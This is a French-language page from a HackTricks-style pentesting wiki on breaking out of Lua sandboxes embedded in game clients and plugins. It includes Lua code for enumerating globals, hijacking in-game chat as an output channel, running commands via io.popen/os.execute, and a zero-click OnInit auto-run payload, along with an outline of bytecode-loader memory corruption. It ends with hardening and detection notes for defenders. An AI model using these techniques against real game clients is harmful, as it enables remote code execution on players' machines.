# Contourner les sandboxes Lua (VM embarquées, clients de jeux)

{{#include ../../../banners/hacktricks-training.md}}

Cette page rassemble des techniques pratiques pour énumérer et casser les "sandboxes" Lua intégrées aux applications (notamment les clients de jeux, les plugins ou les moteurs de script in-app). De nombreux moteurs exposent un environnement Lua restreint, mais laissent accessibles des variables globales puissantes permettant l'exécution arbitraire de commandes, voire la corruption de mémoire native lorsque les chargeurs de bytecode sont exposés.

Idées principales :
- Considérez la VM comme un environnement inconnu : énumérez _G et découvrez les primitives dangereuses accessibles.
- Lorsque stdout/print est bloqué, exploitez tout canal d'UI/IPC dans la VM comme sink de sortie afin d'observer les résultats.
- Si io/os est exposé, vous disposez souvent d'une exécution directe de commandes (io.popen, os.execute).
- Si load/loadstring/loadfile sont exposés, l'exécution de bytecode Lua spécialement conçu peut compromettre la sécurité mémoire dans certaines versions (les vérificateurs des versions ≤5.1 peuvent être contournés ; le vérificateur a été supprimé dans la version 5.2), permettant une exploitation avancée.

## Énumérer l'environnement sandboxé

- Dump l'environnement global afin d'inventorier les tables/fonctions accessibles :
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si aucune fonction `print()` n’est disponible, réutilisez les canaux intégrés à la VM. Exemple issu d’une VM de script de housing de MMO, où la sortie du chat ne fonctionne qu’après un appel audio ; ce qui suit construit une fonction de sortie fiable :<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Généralisez ce modèle pour votre cible : toute textbox, tout toast, logger ou callback UI qui accepte des chaînes peut servir de stdout pour la reconnaissance.

## Exécution directe de commandes si io/os est exposé

Si le sandbox expose encore les bibliothèques standard io ou os, vous disposez probablement d’une exécution immédiate de commandes :
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes :

- L’exécution a lieu dans le processus client ; de nombreuses couches anti-cheat/antidebug qui bloquent les debuggers externes n’empêcheront pas la création de processus dans la VM.
- Vérifiez également : package.loadlib (chargement arbitraire de DLL/.so), require avec des modules natifs, le ffi de LuaJIT (s’il est présent) et la debug library (peut élever les privilèges dans la VM).

## Déclencheurs zero-click via des callbacks auto-run

Si l’application hôte pousse des scripts vers les clients et que la VM expose des hooks auto-run (par exemple, OnInit/OnLoad/OnEnter), placez-y votre payload pour compromettre les systèmes par simple chargement du script :<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Tout callback équivalent (OnLoad, OnEnter, etc.) généralise cette technique lorsque les scripts sont transmis et exécutés automatiquement côté client.

## Primitives dangereuses à rechercher pendant la reconnaissance

Lors de l’énumération de _G, recherchez notamment :
- io, os : io.popen, os.execute, E/S de fichiers, accès aux variables d’environnement.
- load, loadstring, loadfile, dofile : exécutent du code source ou du bytecode ; permettent de charger du bytecode non fiable.
- package, package.loadlib, require : chargement de bibliothèques dynamiques et surface des modules.
- debug : setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo et les hooks.
- LuaJIT-only : ffi.cdef, ffi.load pour appeler directement du code natif.

Exemples d’utilisation minimaux (s’ils sont accessibles) :
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalade facultative : exploitation des chargeurs de bytecode Lua

Lorsque load/loadstring/loadfile sont accessibles mais que io/os sont restreints, l’exécution de bytecode Lua élaboré peut permettre d’obtenir des primitives de divulgation et de corruption mémoire. Points clés :
- Lua ≤ 5.1 incluait un vérificateur de bytecode présentant des contournements connus.<sup>[[4]](#references)</sup>
- Lua 5.2 a entièrement supprimé le vérificateur (position officielle : les applications devraient simplement refuser les chunks précompilés), ce qui élargit la surface d’attaque si le chargement de bytecode n’est pas interdit.<sup>[[2]](#references)[[3]](#references)</sup>
- Les workflows suivent généralement ce schéma : leak de pointeurs via la sortie de la VM, création de bytecode provoquant des confusions de types (par exemple autour de FORLOOP ou d’autres opcodes), puis pivot vers une lecture/écriture arbitraire ou l’exécution de code natif.<sup>[[2]](#references)[[4]](#references)</sup>

Cette voie dépend du moteur et de la version et nécessite une RE. Consultez les références pour des analyses approfondies, les primitives d’exploitation et des exemples de gadgets dans des jeux.

## Notes de détection et de hardening (pour les defenders)

- Côté serveur : refuser ou réécrire les scripts utilisateur ; autoriser uniquement les API figurant sur une allowlist ; supprimer ou lier à une valeur vide io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Côté client : exécuter Lua avec un _ENV minimal, interdire le chargement de bytecode, réintroduire un vérificateur de bytecode strict ou des contrôles de signature, et bloquer la création de processus depuis le processus client.
- Télémétrie : générer une alerte lors de la création d’un processus enfant par gameclient peu après le chargement d’un script ; corréler avec les événements de l’UI, du chat et des scripts.

## Références

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
